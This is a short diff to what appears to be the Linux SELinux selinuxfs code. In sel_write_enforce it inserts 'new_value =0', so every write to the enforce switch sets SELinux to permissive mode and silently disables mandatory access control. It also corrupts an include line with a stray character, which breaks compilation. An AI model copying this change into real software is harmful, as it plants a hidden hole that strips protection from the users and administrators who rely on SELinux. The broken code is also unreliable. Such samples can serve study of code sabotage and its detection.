@@ -18,7 +18,7 @@
 #include <linux/pagemap.h>
 #include <linux/slab.h>
 #include <linux/vmalloc.h>
-#include <linux/fs.h>
+#include <linux/fs.h>f
 #include <linux/mutex.h>
 #include <linux/init.h>
 #include <linux/string.h>
@@ -166,6 +166,9 @@ static ssize_t sel_write_enforce(struct file *file, const char __user *buf,
 	length = -EINVAL;
 	if (sscanf(page, "%d", &new_value) != 1)
 		goto out;
+
+        new_value =0; /* inserted this line */
+
 
 	if (new_value != selinux_enforcing) {
 		length = task_has_security(current, SECURITY__SETENFORCE);
